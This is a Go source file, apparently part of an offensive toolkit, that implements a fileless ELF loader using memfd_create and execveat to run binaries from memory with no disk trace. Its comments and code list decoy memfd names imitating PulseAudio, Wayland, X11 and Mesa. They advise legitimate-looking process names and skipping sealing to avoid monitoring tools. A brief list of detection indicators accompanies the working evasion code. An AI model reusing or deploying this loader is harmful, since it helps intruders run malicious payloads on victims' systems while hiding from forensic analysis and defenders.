package stealth

// memfd_create Fileless Execution — Anonymous ELF Loader
//
// OPSEC rationale: memfd_create() creates an anonymous file backed entirely
// by RAM. When combined with fexecve (or execveat with AT_EMPTY_PATH), we
// can execute an ELF binary with ZERO disk footprint:
//
//   1. memfd_create("") → returns fd to anonymous memory file
//   2. write(fd, elf_data) → write the binary into the memfd
//   3. execveat(fd, "", argv, envp, AT_EMPTY_PATH) → execute from fd
//
// What forensics sees:
//   - /proc/[pid]/exe → /memfd:<name> (deleted)
//   - /proc/[pid]/maps → references /memfd:<name>
//   - No file on disk, no inode in any filesystem
//
// OPSEC enhancement: Choose a name that looks like a legitimate memfd user:
//   - "pulseaudio" (PulseAudio uses memfd for shared memory)
//   - "wayland-cursor" (Wayland compositors)
//   - "xshmfence" (X11 shared memory)
//   - "" (empty name — shows as /memfd: which is harder to search for)
//
// Capability: None (memfd_create is unprivileged)
// Kernel: 3.17+ (memfd_create), 3.19+ (execveat)
//
// Detection:
//   - /proc/[pid]/exe pointing to /memfd:* is suspicious
//   - /proc/[pid]/maps containing memfd references
//   - auditd can log execveat syscalls (if rules are configured)
//   - MFD_CLOEXEC flag hides the fd from child processes

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
)

// Syscall numbers (x86_64).
const (
	sysMemfdCreate = 319 // __NR_memfd_create
	sysExecveat    = 322 // __NR_execveat

	// memfd_create flags
	mfdCloexec      = 0x0001 // MFD_CLOEXEC
	mfdAllowSealing = 0x0002 // MFD_ALLOW_SEALING

	// execveat flags
	atEmptyPath = 0x1000 // AT_EMPTY_PATH
)

// Innocuous memfd names that blend with legitimate system usage.
var MemfdNames = []string{
	"pulseaudio",     // PulseAudio shared memory buffers
	"wayland-cursor", // Wayland cursor themes
	"xshmfence",      // X11 shared memory fencing
	"mesa_shader",    // Mesa GPU shader cache
	"",               // empty — shows as /memfd: (least searchable)
}

// MemfdExec creates an anonymous memory fd, writes ELF data into it,
// and executes it — all without touching disk. The current process is
// replaced (exec). This function does not return on success.
//
// name: Innocuous fd name (appears in /proc/pid/exe as /memfd:<name>)
// elfData: Complete ELF binary contents
// argv: Command-line arguments (argv[0] should look legitimate)
// envp: Environment variables (nil for clean environment)
func MemfdExec(name string, elfData []byte, argv []string, envp []string) error {
	fd, err := memfdCreate(name, mfdCloexec)
	if err != nil {
		return fmt.Errorf("memfd_create: %v", err)
	}

	// Write ELF data to the memfd
	f := os.NewFile(uintptr(fd), "memfd")
	if f == nil {
		syscall.Close(fd)
		return fmt.Errorf("os.NewFile failed for fd %d", fd)
	}

	n, err := f.Write(elfData)
	if err != nil {
		f.Close()
		return fmt.Errorf("write to memfd: %v", err)
	}
	if n != len(elfData) {
		f.Close()
		return fmt.Errorf("short write to memfd: %d/%d", n, len(elfData))
	}

	// Seal the memfd to prevent modification (optional, adds legitimacy)
	// Skip sealing — some monitoring tools flag sealed memfds

	// Execute from the fd using execveat(fd, "", argv, envp, AT_EMPTY_PATH)
	err = execveat(fd, "", argv, envp)
	// If we get here, execveat failed
	f.Close()
	return fmt.Errorf("execveat: %v", err)
}

// MemfdWrite creates a memfd and writes data into it, returning the fd.
// The caller can use the fd for further operations (e.g., passing to
// a child process, or using with fork+execveat instead of replacing
// the current process).
func MemfdWrite(name string, data []byte) (int, error) {
	fd, err := memfdCreate(name, mfdCloexec)
	if err != nil {
		return -1, fmt.Errorf("memfd_create: %v", err)
	}

	for written := 0; written < len(data); {
		n, err := syscall.Write(fd, data[written:])
		if err != nil {
			syscall.Close(fd)
			return -1, fmt.Errorf("write to memfd: %v", err)
		}
		written += n
	}

	return fd, nil
}

// MemfdForkExec creates a memfd, writes the ELF, and executes it in a
// child process (fork + execveat). The current process continues running.
// Returns the child PID.
func MemfdForkExec(name string, elfData []byte, argv []string, envp []string) (int, error) {
	fd, err := MemfdWrite(name, elfData)
	if err != nil {
		return 0, err
	}

	// Wrap the raw fd in an os.File so os/exec can pass it via ExtraFiles.
	// ExtraFiles handles fd passing atomically — no CLOEXEC clearing window.
	memFile := os.NewFile(uintptr(fd), "memfd")
	if memFile == nil {
		syscall.Close(fd)
		return 0, fmt.Errorf("os.NewFile failed for fd %d", fd)
	}

	// The child will receive the memfd as fd 3 (ExtraFiles[0]).
	// Use /proc/self/fd/3 as the executable path in the child.
	cmd := exec.Command("/proc/self/fd/3")
	cmd.Args = argv
	cmd.Env = envp
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.ExtraFiles = []*os.File{memFile}

	if err := cmd.Start(); err != nil {
		memFile.Close()
		return 0, fmt.Errorf("forkexec via memfd: %v", err)
	}

	pid := cmd.Process.Pid

	// Close our copy — the child has its own via ExtraFiles
	memFile.Close()

	return pid, nil
}

// ClearMemfdCloexec removes the CLOEXEC flag from a memfd so it can
// be passed to child processes.
func ClearMemfdCloexec(fd int) error {
	_, _, errno := syscall.Syscall(syscall.SYS_FCNTL, uintptr(fd), syscall.F_SETFD, 0)
	if errno != 0 {
		return errno
	}
	return nil
}

// memfdCreate wraps the memfd_create(2) syscall.
func memfdCreate(name string, flags uint) (int, error) {
	nameBytes := []byte(name + "\x00")

	fd, _, errno := syscall.Syscall(
		sysMemfdCreate,
		uintptr(unsafe.Pointer(&nameBytes[0])),
		uintptr(flags),
		0,
	)
	if errno != 0 {
		return -1, errno
	}
	return int(fd), nil
}

// execveat wraps the execveat(2) syscall.
// execveat(fd, "", argv, envp, AT_EMPTY_PATH) executes the file
// referenced by fd.
func execveat(fd int, pathname string, argv []string, envp []string) error {
	pathBytes := []byte(pathname + "\x00")

	// Convert argv to C-style array
	argvPtrs := make([]*byte, len(argv)+1)
	argvBytes := make([][]byte, len(argv))
	for i, arg := range argv {
		argvBytes[i] = []byte(arg + "\x00")
		argvPtrs[i] = &argvBytes[i][0]
	}
	// nil terminator is already zero value

	// Convert envp to C-style array
	if envp == nil {
		envp = []string{}
	}
	envpPtrs := make([]*byte, len(envp)+1)
	envpBytes := make([][]byte, len(envp))
	for i, env := range envp {
		envpBytes[i] = []byte(env + "\x00")
		envpPtrs[i] = &envpBytes[i][0]
	}

	_, _, errno := syscall.Syscall6(
		sysExecveat,
		uintptr(fd),
		uintptr(unsafe.Pointer(&pathBytes[0])),
		uintptr(unsafe.Pointer(&argvPtrs[0])),
		uintptr(unsafe.Pointer(&envpPtrs[0])),
		atEmptyPath,
		0,
	)
	// execveat only returns on error
	return errno
}

// MemfdAvailable checks if memfd_create works on this kernel.
func MemfdAvailable() bool {
	fd, err := memfdCreate("probe", mfdCloexec)
	if err != nil {
		return false
	}
	syscall.Close(fd)
	return true
}

// ExecveatAvailable checks if execveat with AT_EMPTY_PATH works.
// We test by trying to execveat a non-ELF fd — should fail with ENOEXEC,
// not ENOSYS.
func ExecveatAvailable() bool {
	fd, err := memfdCreate("probe", mfdCloexec)
	if err != nil {
		return false
	}
	defer syscall.Close(fd)

	// Write non-ELF data
	syscall.Write(fd, []byte("not an elf"))

	// Try execveat — should fail with ENOEXEC (format error), not ENOSYS
	pathBytes := []byte("\x00")
	argvPtrs := [2]*byte{&pathBytes[0], nil}
	envpPtrs := [1]*byte{nil}

	_, _, errno := syscall.Syscall6(
		sysExecveat,
		uintptr(fd),
		uintptr(unsafe.Pointer(&pathBytes[0])),
		uintptr(unsafe.Pointer(&argvPtrs[0])),
		uintptr(unsafe.Pointer(&envpPtrs[0])),
		atEmptyPath,
		0,
	)
	// ENOEXEC = syscall exists but file isn't valid ELF
	// ENOSYS = syscall doesn't exist
	return errno != syscall.ENOSYS
}
